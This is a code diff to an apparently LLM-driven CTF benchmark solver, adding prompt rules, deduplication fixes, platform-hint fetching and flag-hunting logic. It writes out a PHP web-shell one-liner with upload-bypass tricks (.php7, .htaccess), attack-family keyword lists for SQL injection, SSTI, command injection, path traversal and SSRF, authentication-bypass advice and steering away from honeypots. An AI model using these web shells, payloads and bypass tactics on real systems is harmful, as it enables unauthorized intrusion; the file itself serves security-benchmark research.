@@ -92,6 +92,18 @@ vi 等一整套）。所以你不需要「请求某个接口」，你**直接跑
 - 每条命令都必须在 20 秒内出结果。给 nmap 加 `--host-timeout 20s -T4`，给 curl 加
   `-m 8`。跑满超时的命令等于白扔一步。
 - HTTP 用 `curl -i -sS -m 10 http://HOST:PORT/路径`，别用 -o /dev/null，要看响应头。
+- **`-X OPTIONS` 返回 200 只说明路由存在，不代表页面能打开。** gunicorn/Werkzeug 对
+  每个已注册路由都会自动应答 OPTIONS，给一个 `Allow: OPTIONS, GET, HEAD, POST` 头、
+  响应体是空的、长度 0。看到 `200 + Allow + Content-Length: 0` 就要认出这是 OPTIONS
+  应答，不要当成「登录页打开了」或「页面时而 200 时而 500」——实跑里这个误判连续
+  烧了 3 步去追一个根本不存在的「间歇性 200」。
+- **沙箱里没有 requests / bs4 这类第三方库。** `python3 -c "import requests"` 必然
+  报 ModuleNotFoundError，白扔一步。要发 HTTP 就用 curl；非要用 python3 就只用标准库
+  （urllib.request / http.client）。
+- **登录页恒 5xx、而所有业务路由都 302 到它，说明登录功能本身坏了**（崩在模板渲染，
+  与任何输入都无关）。这时候不要再猜密码、猜字段名、换 SQL 注入 payload，那些全是
+  无效步数；改去查「怎么绕过认证」：漏加鉴权的路由（试试 /logout 这类边角）、
+  可伪造的会话、路径规范化、方法差异、请求头。
 - 只有 :22 的题：ssh 未必装了客户端，用 session start 起 `ssh -o StrictHostKeyChecking=no
   用户@HOST`（镜像里没 ssh 客户端时改走 ssh_shell 工具），口令从题面或已有事实里取，
   **不要字典爆破**，这类题集明确考「策略选择」，爆破最容易踩主动防御。
@@ -103,6 +115,16 @@ vi 等一整套）。所以你不需要「请求某个接口」，你**直接跑
   不要在同一族里改写同一条 payload（把 python 改写成 curl 不算换思路）。
   提示词里有「已排除」清单，同族在这个路径上失败过就不要再试。
 - 同一个命令不要重复跑；连续两次没进展就换思路（换协议、换端口、换路径、换角度）。
+- **写文件用 `printf` 单行，不要用 heredoc。** `cat > /tmp/x.php <<'EOF'` 这种在
+  JSON 里带换行很容易坏，坏掉的表现是后面 `curl -F file=@/tmp/x.php` 报
+  `(26) Failed to open/read local data`，白烧两步。写成
+  `printf '%s' '<?php system($_GET[c]); ?>' > /tmp/x.php` 一行搞定。
+- **一旦打通了执行/读取，先把它记下来复用**：哪个 URL、哪个参数、哪个 Cookie／
+  X-API-Key。后面每一步都基于同一个入口，不要重新上传一遍再猜文件名——实跑里
+  有过「shell 已经能用，却又去测一个 404 的新文件名」的 8 步浪费。
+- **拿到命令执行就立刻找 flag**，别再挖洞。按这个顺序一次读完：
+  `cat /challenge/flag.txt /flag /flag.txt /root/flag.txt 2>/dev/null; ls -la /challenge`;
+  再不行 `find / -iname '*flag*' 2>/dev/null | head`、`env | grep -i flag`。
 - 响应里出现「检测到 / blocked / 已被记录 / 蜜罐」这类话术，立刻停手这条线，
   换个入口，别硬刚。"""
 
@@ -141,6 +163,11 @@ class SolveContext:
     # （a-04 那题在一个 403 入口上换了 8 种 python 写法），但把结论摆到提示词里，
     # 模型换族的概率明显更高。这里是知识而不是闸门，只提示不拦截。
     excluded: dict[str, int] = field(default_factory=dict)
+    # 已经拿到命令执行的标记。一旦为真，后续不再鼓励继续挖洞，直接找 flag。
+    rce_found: bool = False
+    # 平台官方提示。这东西直接指出漏洞类型和命中位置，价值远高于模型自己猜，
+    # 所以开局就取、每轮都放在提示词靠前位置，而不是等撞墙了才去找。
+    hint: str = ""
 
 
 def parse_targets(container_addr: list[str]) -> tuple[str, list[int]]:
@@ -234,6 +261,15 @@ def _cmd_signature(tool: str, args: dict) -> str:
 
 URL_RE = re.compile(r"https?://[^\s'\"<>|)]+", re.I)
 
+# 命令里带这些就说明它是在「对同一份响应做新的提取」，而不是重复抓取。
+# a-04 实测：模型第 6/10/11/12/15 步都在读同一个 app.js，但每次 grep 的关键字
+# 不同——原来的 URL 去重把这些全拦了，25 步里白扔 10 步，还顺手把真实入口
+# `/api/upload.php` 记成了「已排除」。
+# 注意别把 `python3 -c` 算进来：那是「换一种写法抓同一个地址」，正是去重要管的。
+_EXTRACTOR_RE = re.compile(
+    r"\b(grep|egrep|sed|awk|cut|head|tail|sort|uniq|wc|tr|jq|nl|xxd|base64|"
+    r"strings|diff)\b")
+
 
 def _url_signature(command: str) -> str:
     """命令里出现的 URL 集合。空集合表示这条命令不是在抓某个固定地址。"""
@@ -241,15 +277,22 @@ def _url_signature(command: str) -> str:
     return "|".join(urls)
 
 
-# 攻击族标记。用于把「同一族载荷在同一目标上失败了」记成一条排除项——
-# 字面去重拦不住「同一族换写法」，但把结论写进提示词就能让模型自己换族。
+def _is_pure_fetch(command: str) -> bool:
+    """是不是「只是把响应拿回来」——带文本过滤的不算，那种每次信息量都不同。"""
+    return not _EXTRACTOR_RE.search(command or "")
+
+
+# 攻击族标记。注意每条都要求命令里真的带了这一族的**载荷或手法**，不能只因为
+# 路径里有个 "upload" 就算试过上传——a-04 实测的坑就在这里：读一次
+# /api/upload.php 就被记成「上传绕过 @ /api/upload.php 已排除」，而它恰恰是
+# 真实入口，提示词于是把模型从正解上推开了。
 ATTACK_FAMILIES = (
-    ("上传绕过", ("multipart", "filename=", "upload", ".php.jpg", "\\.phtml")),
-    ("SSRF", ("target_url", "url=", "169.254.169.254", "file://", "gopher://",
-              "dict://", "localhost:", "0.0.0.0:")),
+    ("上传绕过", ("-f ", "--form", "multipart", "filename=", "\\.phtml")),
+    ("SSRF", ("169.254.169.254", "file://", "gopher://", "dict://",
+              "url=http", "target_url=", "dest=")),
     ("路径穿越", ("\\.\\./", "%2e%2e", "/etc/passwd", "..%2f", "win.ini")),
-    ("SQL 注入", ("union select", "or 1=1", "' or '", "sleep(", "sqlmap",
-                  "information_schema")),
+    ("SQL 注入", ("union select", "or 1=1", "or '1'='1", "' or ", "sleep(",
+                  "information_schema", "sqlmap")),
     ("SSTI", ("{{", "${", "<%=", "%7b%7b")),
     ("命令注入", (";id", "|id", "`id", "$(", "&&id", ";cat ", "|cat ")),
     ("越权 id", ("id=1", "id=2", "user_id=", "uid=", "?id=")),
@@ -261,6 +304,16 @@ _FAILURE_RE = re.compile(
     r"(?i)(403 forbidden|401 unauthorized|\b404\b|access denied|invalid (?:api )?key|"
     r"permission denied|not allowed|forbidden|unauthorized|no such file|"
     r"invalid parameter|参数错误|无权|禁止|未授权)")
+
+# 命令执行的典型回显（id/whoami/env 之类）。
+_EXEC_PROOF_RE = re.compile(r"(uid=\d+\([\w.-]+\)|root:x:0:0:|www-data|x:33:33)", re.I)
+
+# 拿到命令执行之后该先看哪儿。CTF 靶场把 flag 放在固定几个位置的居多，
+# 实跑 a-04 时模型已经有 RCE 却还在反复重新上传 shell、没有去 /challenge/。
+FLAG_HUNT = ("/challenge/ /challenge/flag.txt /flag /flag.txt /root/flag /root/flag.txt "
+             "/home/*/flag* /var/www/flag* /opt/flag* /tmp/flag* "
+             "以及 `find / -iname '*flag*' 2>/dev/null`、"
+             "`env | grep -i flag`、`ls -la /challenge`")
 
 
 def _attack_family(command: str) -> tuple[str, str]:
@@ -280,6 +333,9 @@ def _attack_family(command: str) -> tuple[str, str]:
             path = urllib.parse.urlsplit(match.group(0)).path or "/"
         except ValueError:
             path = ""
+    # `/$p`、`/api/{id}` 这类是 shell 变量或模板，不是真实路径，别拿来记账
+    if any(ch in path for ch in ("$", "{", "%", "*", ";")):
+        path = ""
     return family, path
 
 
@@ -809,6 +865,16 @@ def recon_scan(context: SolveContext, board: FactBoard,
         if context.base_url:
             board.add(Fact("service", f"base_url:{context.base_url}",
                            f"默认 Web 入口 {context.base_url}", "low"))
+            # 标记「本题入口」，让候选动作优先给这个端口——同宿主机上的其他服务
+            # 属于别的题，不该抢占有限的候选名额。
+            try:
+                entry_port = str(urllib.parse.urlsplit(context.base_url).port or "")
+            except ValueError:
+                entry_port = ""
+            if entry_port:
+                # key 要带前缀：事实板按 key 去重，用 "host:port" 会和 service 撞车
+                board.add(Fact("entry", f"entry:{host}:{entry_port}",
+                               f"本题入口 {context.base_url}", "high"))
 
     # 路由与凭据发现：首页 + 它引用的 JS，抽路径与硬编码 key。
     # 这是纯确定性工作，不该花模型步数——实测模型会为同一个 app.js 反复下载六次。
@@ -828,10 +894,15 @@ def recon_scan(context: SolveContext, board: FactBoard,
         # 敏感路径批量探测：这一批在旧实现里是模型一步一个 curl 打的，实测吃掉
         # 二三十步。它们的判定完全确定（存在/不存在），交给代码跑，命中结果直接
         # 进事实板——同样一份信息，步数成本从二十几步降到 0。
-        hits = sense.bulk_probe(context.base_url)
+        # 除了固定词表，还要把前端抽到的路由（含 base+相对路径拼接结果）一起探，
+        # 真实入口常常只出现在 JS 里（a-04 的 /api/upload.php 就是拼出来的）。
+        extra = [p for p in sense.combine_routes(routes) if p.startswith("/")]
+        hits = sense.bulk_probe(context.base_url,
+                                paths=list(sense.PROBE_PATHS) + extra)
         if emit_events:
-            emit("recon_probe", base=context.base_url, probed=len(sense.PROBE_PATHS),
-                 hits=len(hits))
+            emit("recon_probe", base=context.base_url,
+                 probed=len(sense.PROBE_PATHS) + len(extra), hits=len(hits),
+                 paths=[f"{h['path']}({h['status']})" for h in hits[:12]])
         if hits:
             lines.append(f" 敏感路径命中 {len(hits)} 个：" + ", ".join(
                 f"{h['path']}({h['status']})" for h in hits[:14]))
@@ -906,6 +977,14 @@ def _build_pick_prompt(challenge: Challenge, context: SolveContext) -> str:
         "## 题面",
         challenge.description.strip() or "（平台未给出题面，只能靠主动侦察）",
         "",
+    ]
+    if context.hint:
+        lines += [
+            "## 平台提示（官方给的，优先按这个方向打，不要绕开它）",
+            context.hint.strip(),
+            "",
+        ]
+    lines += [
         "## 靶标",
         f"host = {context.host}",
         f"平台给的端口 = {context.hint_ports or '(未给)'}",
@@ -980,11 +1059,13 @@ def _extract_json_object(text: str) -> dict | None:
 def solve_challenge(challenge: Challenge, started: StartResult, client, *,
                     deadline: float | None = None, max_steps: int | None = None,
                     shell_timeout: int = 30,
-                    submit: Callable[[str], Any] | None = None) -> list[str]:
+                    submit: Callable[[str], Any] | None = None,
+                    bench_client: Any = None) -> list[str]:
     """跑单道题。返回已提交（或已收集）的 Flag 列表。
 
     submit 由调用方注入（把 flag 交给平台并返回结果），有它就能拿到平台反馈，
-    没有就只在本地收集，供离线测试使用。
+    没有就只在本地收集，供离线测试使用。bench_client 是平台客户端（拿 hint 用），
+    和这里的 client（LLM 客户端）是两回事，别混。
     """
     host, hint_ports = parse_targets(started.container_addr)
     if not host:
@@ -1047,10 +1128,29 @@ def solve_challenge(challenge: Challenge, started: StartResult, client, *,
         emit("solve_blind", unique_code=challenge.unique_code,
              note="端口扫描未发现任何服务，本题可能不可达")
 
+    # ---- 阶段一之后：取平台官方提示 ----
+    # 实测价值极大：a-03 那种「登录页直接 500、所有业务路由都要登录」的题，模型
+    # 自己撞了 25 步全是猜弱 secret 和枚举 404 路径；而平台 hint 一句话就点明了
+    # 漏洞类型和命中位置（「在报表生成和资产搜索功能中输入特殊字符」）。
+    # 取不到（没配 hint / 接口报错）不影响主流程。
+    if bench_client is not None and hasattr(bench_client, "get_hint"):
+        try:
+            hint_result = bench_client.get_hint(challenge.unique_code)
+            text = (getattr(hint_result, "hint", None) or "").strip()
+        except Exception as exc:  # noqa: BLE001
+            text = ""
+            emit("solve_hint_error", unique_code=challenge.unique_code,
+                 detail=f"{type(exc).__name__}: {exc}"[:160])
+        if text:
+            context.hint = text
+            emit("solve_hint", unique_code=challenge.unique_code, hint=text[:300],
+                 step=0)
+
     # ---- 阶段二：命令/会话循环 ----
     last_tool = ""
     repeat = 0
     tripwires = 0
+    blocked_streak = 0
     facts_seen = board.stats()["facts"]
     stale = 0
     for step in range(1, steps + 1):
@@ -1173,24 +1273,37 @@ def solve_challenge(challenge: Challenge, started: StartResult, client, *,
         signature = _cmd_signature(tool, call_args)
         repeats = context.cmd_seen.get(signature, 0)
         raw_command = str(call_args.get("command") or call_args.get("cmd") or "")
-        url_sig = _url_signature(raw_command) if tool in ("shell", "session_start") else ""
+        url_sig = (_url_signature(raw_command)
+                   if tool in ("shell", "session_start") and _is_pure_fetch(raw_command)
+                   else "")
         url_hits = context.url_seen.get(url_sig, 0) if url_sig else 0
-        # 两道去重：同一条命令第三遍拦；同一组 URL 抓第三遍也拦。
-        # 靶标不会因为重复请求变好，只会把步数预算烧在同一个 404 上。
+        # 两道去重：同一条命令第三遍拦；同一组 URL「纯抓取」第三遍也拦。
+        # 带 grep/sed/head 这类提取的不拦——同一份响应换关键字问是新的信息，
+        # 拦掉只会让模型在「换写法」和「被拒绝」之间空转。
         blocked = None
         if tool in ("shell", "session_start") and repeats >= 2:
             blocked = ("这条命令", context.cmd_cache.get(signature, ""), repeats)
         elif url_sig and url_hits >= 2:
             blocked = ("这组 URL", context.url_cache.get(url_sig, ""), url_hits)
+        # 连续被 URL 去重拦太多次说明提示没起作用，这一轮放行让模型拿回控制权，
+        # 否则它会在「换个说法再试」上把整个步数预算耗光（实跑 10/25 步）。
+        # 只对 URL 维度放行：一字不差的重复命令永远不会产生新信息，没得商量。
+        if blocked and blocked[0] == "这组 URL" and blocked_streak >= 3:
+            emit("solve_dedupe_override", unique_code=challenge.unique_code,
+                 step=step, note="URL 去重连续拦 3 次，本轮放行")
+            blocked = None
         if blocked:
             what, cached, hits = blocked
+            blocked_streak += 1
             output = (f"（拦下）{what}已经抓过 {hits} 次，结果不会变。"
                       f"换路径/换参数/换攻击点，或者从下面这次输出继续推。\n"
                       f"上次输出：\n{cached[:600] or '(无)'}")
             elapsed = time.time() - started_at
             emit("solve_repeat_blocked", unique_code=challenge.unique_code,
-                 step=step, tool=tool, repeats=hits, kind=what)
+                 step=step, tool=tool, repeats=hits, kind=what,
+                 streak=blocked_streak)
         else:
+            blocked_streak = 0
             output = toolkit.run(tool, call_args)
             elapsed = time.time() - started_at
             if tool in ("shell", "session_start"):
@@ -1232,6 +1345,46 @@ def solve_challenge(challenge: Challenge, started: StartResult, client, *,
         if probe.too_easy:
             emit("solve_too_easy", unique_code=challenge.unique_code, step=step,
                  marker=probe.too_easy, note="响应过于配合，疑似蜜罐")
+
+        # 上传成功时把落盘路径记成事实——模型自己会忘。
+        # a-04 实跑：第 7 步传上 shell.php7、第 9 步传上 .htaccess、第 10 步已经
+        # 打出 uid=33，第 18/19 步却在逐个试 shell.php / cmd.php 全是 404，
+        # 因为「哪个文件名是活的」只存在于模型上下文里，一压缩就丢。
+        for uploaded in re.findall(r'"path"\s*:\s*"(uploads/[^"]+)"', output or ""):
+            url = f"{context.base_url.rstrip('/')}/{uploaded}"
+            if board.add(Fact("artifact", f"upload:{uploaded}",
+                              f"已上传 {url}", "high")):
+                emit("solve_upload_recorded", unique_code=challenge.unique_code,
+                     step=step, url=url)
+
+        # curl 读不到本地文件是「上一步写文件失败」的固定症状，连试三遍都一样。
+        # 直接把正确写法塞给模型，比让它自己揣摩快得多。
+        if "(26) Failed to open/read local data" in (output or ""):
+            context.observations.append(Observation(
+                step, "(文件没建成)", {},
+                "curl 报 (26) 说明 -F 要读的本地文件根本不存在——上一步的写文件失败了。"
+                "换成一行的 printf 再传，并且先确认文件真的在：\n"
+                "printf '%s' '<?php echo 1; ?>' > /tmp/x.php && ls -l /tmp/x.php "
+                "&& curl -F 'file=@/tmp/x.php;filename=x.php7' ...",
+                time.time() - started_at))
+
+        # 拿到命令执行是个分水岭：从这一刻起继续挖洞是浪费，该去找 flag 了。
+        # 实跑 a-04 时模型第 10 步就打出了 uid=33(www-data)，之后 8 步还在反复
+        # 重新上传 shell、测试 404 的路径，从没去看 /challenge/flag.txt——那里
+        # 就是答案。所以这里主动把「你已经能执行命令」和「flag 常在哪」怼到眼前，
+        # 并把这条能力记进事实板，后续候选动作也能引用。
+        if _EXEC_PROOF_RE.search(output or "") and not context.rce_found:
+            context.rce_found = True
+            board.add(Fact("rce", f"rce:{host}", "已确认可执行系统命令", "high"))
+            emit("solve_rce", unique_code=challenge.unique_code, step=step,
+                 note="已拿到命令执行，转入找 flag")
+            context.observations.append(Observation(
+                step, "(已执行命令)", {},
+                "你已经能在这个靶标上执行系统命令了。不要再重新上传 shell 或枚举接口，"
+                "直接把这次能用的入口和参数记下来复用，然后按顺序读这几个位置：\n"
+                f"{FLAG_HUNT}\n"
+                "一条命令里可以串多个 cat（`cat A B C 2>/dev/null`），一次读完。",
+                time.time() - started_at))
 
         # 重复动作检测：连续三次一样就强制换路（模型很容易陷在同一个 curl 里）
         signature = f"{tool}:{json.dumps(args, sort_keys=True, ensure_ascii=False)}"
@@ -1283,7 +1436,7 @@ def make_llm_solver(*, max_steps: int | None = None,
     global_deadline = time.time() + total
 
     def solver(challenge: Challenge, started: StartResult,
-               submit=None) -> list[str]:
+               submit=None, bench_client=None) -> list[str]:
         # 单题 780s（13 分钟）：上一轮 7 题各占满 900s 正好吃光 6300s 总预算，
         # 最后一道题拿到 0 秒被直接跳过。
         per = int(os.environ.get("BENCH_CHALLENGE_SECONDS", "780"))
@@ -1294,5 +1447,5 @@ def make_llm_solver(*, max_steps: int | None = None,
             return []
         return solve_challenge(challenge, started, client, deadline=deadline,
                                max_steps=max_steps, shell_timeout=shell_timeout,
-                               submit=submit)
+                               submit=submit, bench_client=bench_client)
     return solver
